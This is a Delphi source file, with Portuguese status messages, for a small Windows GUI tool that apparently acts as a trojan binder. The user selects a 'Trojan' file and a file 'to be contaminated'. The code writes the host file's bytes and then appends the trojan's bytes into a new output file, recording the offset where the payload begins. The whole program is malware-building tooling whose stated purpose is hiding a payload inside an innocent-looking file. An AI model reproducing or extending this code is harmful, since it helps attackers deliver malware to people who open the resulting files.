unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  ComCtrls, Buttons, StdCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    SpeedButton2: TSpeedButton;
    SpeedButton3: TSpeedButton;
    SaveDialog1: TSaveDialog;
    Label3: TLabel;
    Label2: TLabel;
    StatusBar1: TPanel;
    Edit1: TEdit;
    Edit2: TEdit;
    BitBtn1: TBitBtn;
    BitBtn2: TBitBtn;
    OpenDialog1: TOpenDialog;
    procedure SpeedButton2Click(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure BitBtn1Click(Sender: TObject);
    procedure BitBtn2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.DFM}

procedure TForm1.SpeedButton2Click(Sender: TObject);
var
  FromF, FromF2, ToF: file;
  NumRead, NumWritten: Integer;
  Buf: array[1..1024] of Char;
  count, N : Integer;

begin
    StatusBar1.Caption:='Preparando arquivo do Trojan...';
    AssignFile(FromF, Edit2.Text);
    Reset(FromF, 1);
    StatusBar1.Caption:='Preparando arquivo a ser contamindo...';
    AssignFile(FromF2,Edit1.Text);
    Reset(FromF2, 1);
    StatusBar1.Caption:='Gravando arquivo do Trojan...';
    count := 0;
    if SaveDialog1.Execute then begin
      AssignFile(ToF, SaveDialog1.FileName);
      Rewrite(ToF, 1);
      repeat
        BlockRead(FromF2, Buf, SizeOf(Buf), NumRead);
        BlockWrite(ToF, Buf, NumRead, NumWritten);
        count := count+1;
      until (NumRead = 0) or (NumWritten <> NumRead);

      StatusBar1.Caption:='Gravando arquivo a ser contaminado...';

      N:=FilePos(ToF);

      repeat
        BlockRead(FromF, Buf, SizeOf(Buf), NumRead);
        BlockWrite(ToF, Buf, NumRead, NumWritten);
      until (NumRead = 0) or (NumWritten <> NumRead);

      StatusBar1.Caption:='Fechando Arquivos...';
      CloseFile(FromF);
      CloseFile(FromF2);
      CloseFile(ToF);

     StatusBar1.Caption:='Concluido! Versão do arquivo: '+inttostr(n)+' Loop: ' + IntToStr(count);
    end;
end;


procedure TForm1.SpeedButton3Click(Sender: TObject);
begin
Close;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
Application.Terminate;
end;

procedure TForm1.BitBtn1Click(Sender: TObject);
begin
 OpenDialog1.InitialDir := ExtractFilePath(Edit1.Text);
 if OpenDialog1.Execute then Edit1.Text := OpenDialog1.FileName;
end;

procedure TForm1.BitBtn2Click(Sender: TObject);
begin
 OpenDialog1.InitialDir := ExtractFilePath(Edit2.Text);
 if OpenDialog1.Execute then Edit2.Text := OpenDialog1.FileName;
end;

end.
